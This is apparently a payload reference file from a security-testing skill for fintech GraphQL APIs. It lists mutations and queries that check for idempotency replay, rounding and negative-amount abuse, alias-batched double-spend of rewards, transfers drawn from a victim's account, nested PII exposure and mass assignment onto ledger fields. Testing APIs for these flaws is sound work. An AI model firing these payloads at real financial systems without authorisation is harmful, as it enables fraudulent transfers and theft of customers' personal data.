# Payloads — Fintech GraphQL-specific hunting

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# fintech-graphql — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payload & Detection Patterns



**Idempotency-key replay test:**

```graphql

mutation {

  transferFunds(input: {

    idempotencyKey: "test-key-001"

    sourceAccountId: "acc_1"

    destAccountId: "acc_2"

    amount: "10.00"

  }) { transactionId status }

}

```

Send twice with the identical `idempotencyKey`. Two successful, distinct `transactionId` values

= idempotency not enforced.



**Decimal-precision / rounding probes:**

```graphql

mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "0.001"}) { transactionId } }

mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "9999999999999999.99"}) { transactionId } }

mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "1e2"}) { transactionId } }

mutation { transferFunds(input: {sourceAccountId:"acc_1", destAccountId:"acc_2", amount: "-50.00"}) { transactionId } }

```

Sub-cent amounts test truncate-vs-round handling (repeat N times to accumulate a rounding-error

balance drift); scientific notation and oversized values test whether the `Money`/`Decimal`

scalar parser falls back to a native float/int with overflow or precision-loss behavior; negative

amounts test whether the resolver assumes sign server-side or trusts the client's.



**Alias-batched double-spend probe (confirm before escalating to parallel HTTP):**

```graphql

mutation {

  r1: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }

  r2: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }

  r3: redeemRewards(input: {rewardId: "rwd_1", accountId: "acc_1"}) { success }

}

```

If more than one alias succeeds against a single-use reward/coupon, the resolver doesn't

serialize per-account/per-resource writes within a batched request — see `race-condition`

for combining this with parallel HTTP POSTs to confirm real double-spend impact.



**Source-account authorization probe (asymmetric IDOR check):**

```graphql

mutation {

  transferFunds(input: {

    sourceAccountId: "VICTIM_ACCOUNT_ID"

    destAccountId: "ATTACKER_CONTROLLED_ACCOUNT_ID"

    amount: "1.00"

  }) { transactionId status }

}

```

Run as the attacker's own session/token. Success = the resolver validated the destination is

attacker-controlled (obviously required) but never validated that the source belongs to the

caller.



**Nested field-level PII probe:**

```graphql

query {

  transaction(id: "txn_123") {

    amount

    counterparty { displayName ssnLast4 routingNumber kycStatus }

  }

}

```

Query as a user with no relationship to the counterparty beyond a shared transaction; success on

the nested PII fields is the finding even if the top-level `transaction` query correctly scoped

the transaction itself.



**Mass-assignment probe on admin-shaped input fields:**

```graphql

mutation {

  updateTransaction(input: {id: "txn_123", status: "COMPLETED", amount: "0.01"}) { id status }

}

```

Send as a non-admin user against a mutation the client UI never exposes these fields for; a

schema that accepts them anyway is mass assignment onto ledger state.



---
